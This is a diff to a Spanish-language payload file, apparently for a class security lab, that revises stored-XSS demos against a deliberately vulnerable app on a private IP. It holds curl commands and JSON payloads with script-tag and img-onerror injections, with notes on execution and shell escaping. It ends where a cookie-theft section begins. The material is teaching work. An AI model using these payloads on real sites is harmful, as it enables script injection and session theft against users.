@@ -61,8 +61,10 @@ file:///ruta/absoluta/al/proyecto/data/usuarios.txt
 # El backend confia ciegamente en la respuesta y el frontend usa innerHTML.
 # =============================================================================
 
-# --- 2.1 XSS basico con alert ---
-# Demuestra ejecucion de JavaScript al cargar el portafolio.
+# --- 2.1 XSS basico con <script> (propagacion, NO ejecucion) ---
+# OJO: un <script> insertado via innerHTML NO se auto-ejecuta (estandar HTML5).
+# Sirve para demostrar que el payload se PROPAGA sin sanitizar (backend -> DOM),
+# pero para la EJECUCION en vivo hay que usar el payload 2.2 (<img onerror>).
 # Comando:
 # curl -X POST http://192.168.56.100:5000/update_repos \
 #   -H "Content-Type: application/json" \
@@ -70,14 +72,22 @@ file:///ruta/absoluta/al/proyecto/data/usuarios.txt
 
 [{"nombre":"repo-malicioso","descripcion":"<script>alert('XSS')</script>","url":"https://evil.com","lenguaje":"JavaScript"}]
 
-# --- 2.2 XSS con event handler (bypass de filtros basicos de script) ---
-# Demuestra XSS via atributo onerror cuando se filtra la etiqueta <script>.
+# --- 2.2 XSS con event handler (SI se ejecuta - payload de la demo en vivo) ---
+# <img> con onerror que dispara JavaScript. alert(document.domain) es a prueba de
+# fallos: sin comillas ni espacios, funciona igual en el shell y en el atributo
+# HTML (un onerror SIN comillas se cortaria en el primer espacio). Muestra el
+# dominio de la victima, evidenciando que el JS corrio en SU contexto.
 # Comando:
 # curl -X POST http://192.168.56.100:5000/update_repos \
 #   -H "Content-Type: application/json" \
-#   -d '[{"nombre":"repo-img","descripcion":"<img src=x onerror=alert(\"XSS\")>","url":"https://evil.com","lenguaje":"HTML"}]'
+#   -d '[{"nombre":"repo-img","descripcion":"<img src=x onerror=alert(document.domain)>","url":"https://evil.com","lenguaje":"HTML"}]'
 
-[{"nombre":"repo-img","descripcion":"<img src=x onerror=alert('XSS')>","url":"https://evil.com","lenguaje":"HTML"}]
+[{"nombre":"repo-img","descripcion":"<img src=x onerror=alert(document.domain)>","url":"https://evil.com","lenguaje":"HTML"}]
+
+# Variante con mensaje de texto (tiene espacios -> el onerror necesita comillas,
+# lo que choca con el escapado del shell). Guarda este JSON en xss.json y envialo
+# con:  curl -X POST http://192.168.56.100:5000/update_repos -H "Content-Type: application/json" -d @xss.json
+# [{"nombre":"repo-img","descripcion":"<img src=x onerror=\"alert('XSS - Grupo 6')\">","url":"https://evil.com","lenguaje":"HTML"}]
 
 # --- 2.3 XSS con robo de cookies (demostracion avanzada) ---
 # Demuestra exfiltracion de cookies de sesion via fetch a servidor del atacante.
